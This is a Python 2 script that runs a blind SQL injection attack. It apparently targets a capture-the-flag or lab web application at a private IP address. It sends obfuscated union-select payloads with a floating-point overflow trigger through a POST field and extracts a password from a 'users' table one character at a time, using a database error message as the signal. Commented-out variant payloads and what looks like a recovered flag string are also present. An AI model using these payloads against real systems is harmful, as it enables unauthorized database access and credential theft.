#!/usr/bin/python2.7
#coding:utf-8

from sys import *
import requests
import string
import re
# import hackhttp

# host = ''
# port = int(argv[2])
timeout = 30

string = string.digits + string.ascii_letters + string.punctuation
# string = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{'
paramsPostBase = {"usr":"1"}
# payloadBase = "-1'^(((lpad((select/**/`1`/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/users)a/**/limit/**/1,1),{pos},'0')>'{password}')+1)*1e308)^'1"
# payloadBase = "-1'^(((lpad((select/**/`1`/**/from/**/(select/**/1,2,3,4,5,6/**/union/**/select/**/*/**/from/**/mysql.innodb_table_stats)a/**/limit/**/1,1),{pos},'0')>'{password}')+1)*1e308)^'1"
payloadBase = "123'^(((substr((select/**/`2`/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/users)a/**/limit/**/2,1),{pos},1)>'{password}')+1)*1e308)^'1"

def getPass(url):
	# 获取password
	url = url + 'xinqingfuza2019qwieasjkdnzx.php'
	password = ""
	for i in range(1,30):
		for s in string:
			password = str(password + s)
			payload = payloadBase.format(pos=i, password=s)
			paramsPostBase['usr'] = payload
			# print paramsPostBase
			resp = requests.post(url=url, data=paramsPostBase,timeout=timeout)
			# print resp.content
			# exit()
			if '数据库操作异常' in resp.content:
				password = password[:-1]
			else:
				print 'pass:' + password
				break


if __name__ == '__main__':
	url = 'http://172.29.7.105/'
	print(getPass(url))

#esahk2cqadmt862nbz
